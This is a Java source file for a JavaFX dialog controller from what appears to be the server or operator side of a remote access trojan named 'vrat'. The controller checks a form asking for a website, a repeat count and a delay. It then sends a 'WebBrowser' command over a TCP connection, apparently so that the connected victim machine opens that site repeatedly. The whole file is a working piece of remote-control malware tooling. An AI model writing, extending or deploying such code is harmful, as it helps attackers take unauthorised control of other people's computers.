package vrat.server.contextFxml;

import com.jmr.wrapper.common.Connection;
import javafx.fxml.FXML;
import javafx.fxml.Initializable;
import javafx.scene.Node;
import javafx.scene.control.Alert;
import javafx.scene.control.TextField;
import javafx.scene.image.Image;
import javafx.stage.Stage;
import java.net.URL;
import java.util.ArrayList;
import java.util.ResourceBundle;
import javafx.event.ActionEvent;

/*
 * @author vrmg
 */

public class WebBrowserController implements Initializable{

	@FXML
    private TextField website;
	@FXML
    private TextField howMany;
	@FXML
    private TextField delay;
    public static Connection con;

    @Override
    public void initialize(URL location, ResourceBundle resources) {	
    }

    public static void setCon(Connection co){
        con = co;
    }
	
	@FXML
    public void handleDone(ActionEvent event) {
        String websiteString = website.getText();
        String howManytemp = howMany.getText();
        String delaytemp = delay.getText();
        int howManyInt = 0;
        int delayInt = 0;
        
		while (true) {
            if (websiteString.isEmpty()) {
                errorMessage("Check if you entered something in the field: \"Website\"");
                break;
			}

            if (howManytemp.isEmpty()) {
                errorMessage("Check if you entered something in the field: \"How many\"");
                break;
            }

            try {
                howManyInt = Integer.parseInt(howManytemp);
            } catch (NumberFormatException e) {
                errorMessage("Make sure you only enter numbers in: \"How many\"");
                break;
            }

            if (delaytemp.isEmpty()) {
                errorMessage("Check if you entered something in the field: \"Delay\"");
                break;
            }

            try {
                delayInt = Integer.parseInt(delaytemp);
            } catch (NumberFormatException e) {
                errorMessage("Make sure you only enter numbers in: \"Delay\"");
                break;
            }
			
			ArrayList<Object> list = new ArrayList<>();
			list.add("WebBrowser");
			list.add(websiteString);
			list.add(howManyInt);
			list.add(delayInt);
            con.sendTcp(list);

            ((Node)(event.getSource())).getScene().getWindow().hide();
			break;
        }
    }

    private void errorMessage(String a){
        Alert alert = new Alert(Alert.AlertType.ERROR);
        alert.setTitle("Error");
        alert.setHeaderText(a);
        Stage stage = (Stage) alert.getDialogPane().getScene().getWindow();
        stage.getIcons().add(new Image(this.getClass().getResource("/vrat/icons/warning.png").toString()));
        alert.showAndWait();
    }
}
